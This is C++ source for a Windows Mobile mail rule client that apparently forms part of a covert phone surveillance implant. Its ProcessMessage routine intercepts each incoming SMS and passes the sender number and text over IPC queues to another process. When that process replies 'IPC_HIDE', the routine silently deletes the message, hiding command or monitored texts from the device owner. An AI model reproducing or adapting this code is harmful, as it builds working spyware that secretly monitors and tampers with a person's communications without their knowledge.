#define INITGUID
#include <windows.h>
#include <cemapi.h>
#include "MapiRule.h"
#include "IPCQueue.h"
#include "IPCMsg.h"

void DebugTrace(const PWCHAR pwMsg, const PWCHAR pwFileName, const PWCHAR pwFunction, const UINT uLine, UINT uPriority, BOOL bLastError) {
#ifdef _DEBUG
#pragma message(__LOC__"DebugTrace attivo!")
	DWORD dwLastErr;
	
	dwLastErr = GetLastError();
	
	string strMsg;
	char buffer[500];
	SYSTEMTIME systemTime;
	DWORD dwWritten, dwTime = GetTickCount();

	GetSystemTime(&systemTime);

	// Versione per il log su File
	if (pwMsg == NULL)
		return;

	HANDLE hFile = CreateFile(L"\\BDSMSRunLog.txt", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

	if (hFile == INVALID_HANDLE_VALUE) {
		DBG_ERROR_VAL(GetLastError(), L"CreateFile()");
		return;
	}

	SetFilePointer(hFile, 0, NULL, FILE_END);

	sprintf(buffer, "Day: %02d - %02d:%02d:%02d:%04d - %S", systemTime.wDay, systemTime.wHour, systemTime.wMinute, 
		systemTime.wSecond, systemTime.wMilliseconds, pwMsg);

	strMsg = buffer;
	
	if (bLastError) {
		sprintf(buffer, "GetLastError(): 0x%08x ", dwLastErr);
		strMsg += buffer;
	}

	strMsg.resize(strMsg.size() - 1);
	strMsg += "\r\n";

	if (WriteFile(hFile, (void *)strMsg.c_str(), strMsg.size(), &dwWritten, NULL) == FALSE) {
		DBG_ERROR_VAL(GetLastError(), L"WriteFile()");
	}

	CloseHandle(hFile);
	return;
#endif // _DEBUG
}

void DebugTraceInt(const PWCHAR pwMsg, const PWCHAR pwFileName, const PWCHAR pwFunction, const UINT uLine, UINT uPriority, BOOL bLastError, INT iVal) {
#ifdef _DEBUG
#pragma message(__LOC__"DebugTraceInt attivo!")
	wstringstream out;
	wstring strMsg = pwMsg;

	out << std::hex;
	out << iVal;

	strMsg += L"[iVal: 0x";
	strMsg += out.str();

	if (bLastError)
		strMsg += L"] ";
	else
		strMsg += L"]\r\n";
	
	DebugTrace((PWCHAR)strMsg.c_str(), pwFileName, pwFunction, uLine, uPriority, bLastError);
#endif
}

// IpcQueueLocalSA

CMailRuleClient::CMailRuleClient()
: m_qRead(NULL), m_qWrite(NULL)
{
}

CMailRuleClient::~CMailRuleClient()
{
  if (m_qRead)
    delete m_qRead;

  if (m_qWrite)
    delete m_qWrite;
}

/**
 *	QueryInterface
 **/
HRESULT CMailRuleClient::QueryInterface(REFIID rif, void** ppobj)
{
	if (!ppobj)
		return E_INVALIDARG;

	*ppobj = NULL;

	if ((rif == IID_IUnknown) || (rif == IID_IMailRuleClient)) {
		*ppobj = (LPVOID) this;
	}

	if (*ppobj)
		((LPUNKNOWN)*ppobj)->AddRef();

	return (*ppobj) ? S_OK : E_NOINTERFACE;
}

ULONG CMailRuleClient::AddRef()
{
	return InterlockedIncrement(&m_cRef);
}

ULONG CMailRuleClient::Release()
{
	InterlockedDecrement(&m_cRef);

	int nLocal = m_cRef;

	if (!m_cRef)
		delete this;

	return nLocal;
}

#define CLSID_KEY TEXT("\\CLSID\\{DD69A982-6C70-4a55-8BE4-6B32A1F9A527}")
HRESULT CMailRuleClient::Initialize(IMsgStore *pMsgStore, MRCACCESS *pmaDesidered)
{
	DBG_TRACE(L"Initializing queues.", DBG_NOTIFY, FALSE);
	
	*pmaDesidered = MRC_ACCESS_WRITE;
	
	HKEY hKey;
	
	ZeroMemory(this->m_wszServiceProvider, sizeof(m_wszServiceProvider));
	m_cInitialized = false;

	if (RegOpenKeyEx(HKEY_CLASSES_ROOT, TEXT("\\CLSID\\{DD69A982-6C70-4a55-8BE4-6B32A1F9A527}"), 0, 0, &hKey) == ERROR_SUCCESS) {
		DWORD dwType, cData = sizeof(this->m_wszServiceProvider) * 2;

		RegQueryValueEx(hKey, TEXT("Service Provider"), 0, &dwType, (LPBYTE)this->m_wszServiceProvider, &cData);

		RegCloseKey(hKey);
		m_cInitialized = true;
	}

	UINT i = 0;
	while ( i < 5 )
	{
		m_qRead = new IPCQueue(L"IpcQueueLocalSAW", true);
		if (m_qRead == NULL)
		{
			//MessageBox(NULL, L"Cannot create Write queue. Retrying in 2 secs", L"DEBUG", MB_OK);
			Sleep(2000);
		}
		else
			break;
	}

	while ( i < 5 )
	{ 
		m_qWrite = new IPCQueue(L"IpcQueueLocalSAR", false);
		if (m_qWrite == NULL)
		{
			// MessageBox(NULL, L"Cannot create Read queue. Retrying in 2 secs", L"DEBUG", MB_OK);
			Sleep(2000);
		}
		else
			break;
	}

	if (m_qRead->Open() == false)
	{
		DBG_TRACE(L"Cannot open Read queue.", DBG_CRITICAL, FALSE);
		return E_FAIL;
	}

	if (m_qWrite->Open() == false)
	{
		DBG_TRACE(L"Cannot open Write queue.", DBG_CRITICAL, FALSE);
		return E_FAIL;
	}
	
	DBG_TRACE(L"Queue inited.", DBG_NOTIFY, FALSE);
	
	return S_OK;
}

HRESULT CMailRuleClient::DeleteMessage(
		IMsgStore *pMsgStore, 
		IMessage *pMsg, 
		ULONG cbMsg, 
		LPENTRYID lpMsg, 
		ULONG cbDestFolder, 
		LPENTRYID lpDestFolder, 
		ULONG *pulEventType, 
		MRCHANDLED *pHandled)
{
	HRESULT hr = S_OK;
	ENTRYLIST lst;
	SBinary sbin;
	IMAPIFolder *pFolder = NULL;
	
	hr = pMsgStore->OpenEntry(cbDestFolder, lpDestFolder, NULL, 0, NULL, (LPUNKNOWN *) &pFolder);
	if (FAILED(hr)) {
		DBG_TRACE(L"Failed opening message entry.", DBG_HIGH, TRUE);
		return hr;
	}
	
	lst.cValues = 1;
	sbin.cb = cbMsg;
	sbin.lpb = (LPBYTE) lpMsg;
	lst.lpbin = &sbin;
	
	hr = pFolder->DeleteMessages(&lst, NULL, NULL, 0);
	if (FAILED(hr)) {
		DBG_TRACE(L"Failed deleting messages.", DBG_HIGH, TRUE);
		*pulEventType = fnevObjectDeleted;
		*pHandled = MRC_HANDLED_DONTCONTINUE;
	}
	
	if (pFolder)
		pFolder->Release();

	DBG_TRACE(L"Message deleted.", DBG_NOTIFY, FALSE);
	
	return hr;
}

HRESULT CMailRuleClient::ProcessMessage(
										IMsgStore *pMsgStore, 
										ULONG cbMsg, 
										LPENTRYID lpMsg,  
										ULONG cbDestFolder, 
										LPENTRYID lpDestFolder, 
										ULONG *pulEventType, 
										MRCHANDLED *pHandled)
{
	HRESULT hr = S_OK;
	IMessage *pMsg = NULL;
	SizedSPropTagArray(1, sptaSubject) = { 1, PR_SUBJECT };
	SizedSPropTagArray(1, sptaSenderEmailAddress) = { 1, PR_SENDER_EMAIL_ADDRESS };
	ULONG cValues = 0;
	SPropValue *pspvSubject = NULL;
	SPropValue *pspvSenderEmailAddress = NULL;

	if (this->m_cInitialized == false)
		return hr;

	//
	// open message
	//
	hr = pMsgStore->OpenEntry(cbMsg, lpMsg, NULL, 0, NULL, (LPUNKNOWN *) &pMsg);
	if (FAILED(hr)) {
		DBG_TRACE(L"Failed opening message.", DBG_CRITICAL, TRUE);
		return hr;
	}
	
	//
	// get message properties
	//
	LPWSTR lpwSubject = NULL;
	hr = pMsg->GetProps((SPropTagArray *) &sptaSubject, MAPI_UNICODE, &cValues, &pspvSubject);

	if (FAILED(hr))
		DBG_TRACE(L"Failed getting subject.", DBG_HIGH, FALSE);
	else
		lpwSubject = pspvSubject->Value.lpszW;
	
	LPWSTR lpwPhoneNumber = NULL;
	hr = pMsg->GetProps((SPropTagArray *) &sptaSenderEmailAddress, MAPI_UNICODE, &cValues, &pspvSenderEmailAddress);
	if (FAILED(hr))
		DBG_TRACE(L"Failed getting sender address.", DBG_HIGH, FALSE);
	else
		lpwPhoneNumber = pspvSenderEmailAddress->Value.lpszW;
	
	DBG_TRACE(L"Sender phone number:", DBG_CRITICAL, FALSE);
	DBG_TRACE(lpwPhoneNumber, DBG_CRITICAL, FALSE);
	
	//
	// write message to queue
	//
	IPCMsg* msg = new IPCMsg(lpwPhoneNumber, lpwSubject);
	if (m_qWrite->WriteMessage(msg) == false)
	{
		DBG_TRACE(L"Write failed", DBG_HIGH, FALSE);
		return S_OK;
	}
	
	DBG_TRACE(L"Message written to queue.", DBG_NOTIFY, FALSE);
	
	//
	// wait for reply
	//
	IPCMsg* msgReply = m_qRead->WaitForReply();
	DWORD dwReply = IPC_PROCESS;

	if (msgReply) {
		dwReply = msgReply->Reply();
	} else {
		DBG_TRACE(L"No reply, assuming default (PROCESS)\n", DBG_HIGH, FALSE);
	}
	
	WCHAR lpwStr[256] = {0};
	// ZeroMemory(lpwStr, 256 * sizeof(WCHAR));

	switch(dwReply)
	{
	case IPC_HIDE:
		this->DeleteMessage(pMsgStore, pMsg, cbMsg, lpMsg, cbDestFolder, lpDestFolder, pulEventType, pHandled);

		if (pMsg)
			pMsg->Release();

		DBG_TRACE(L"Message deleted", DBG_NOTIFY, FALSE);
		break;
	
	case IPC_PROCESS:
	default:
		DBG_TRACE(L"Message accepted", DBG_NOTIFY, FALSE);
		// do nothing
		break;
	}
	
	if (msgReply)
		delete msgReply;
	
	DBG_TRACE(L"processing completed.", DBG_NOTIFY, FALSE);
	return S_OK;
}
